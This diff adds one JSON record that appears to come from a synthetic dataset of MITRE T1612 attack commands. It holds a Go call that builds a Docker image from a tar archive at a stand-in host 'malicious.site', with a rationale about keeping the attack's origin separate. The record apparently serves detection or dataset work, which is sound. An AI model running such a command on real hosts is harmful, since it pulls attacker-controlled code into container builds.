@@ -1,0 +1,31 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "go",
+  "command": "client.BuildImageFromRemote('http://malicious.site/maliciouscontext.tar', nil)",
+  "explanation": "Compiles a Docker image from a remote tar archive hosted at a malicious URL using docker-go-client.",
+  "rationale_steps": [
+    "Fetch an externally hosted malicious tar archive to maintain separation from the attack origin.",
+    "Use this archive to build the Docker image, embedding the remote malicious components seamlessly."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-GO-T1612-209b85e4-bd1028bc",
+  "source_prompt_hash": "209b85e4",
+  "timestamp_utc": "2025-07-10T23:24:48.105630Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": null,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.46,
+      "command_length": 78
+    },
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "forbidden_tokens": false,
+    "obfuscation_suspicious": false,
+    "obfuscation_entropy": 4.46,
+    "command_length": 78
+  }
+}
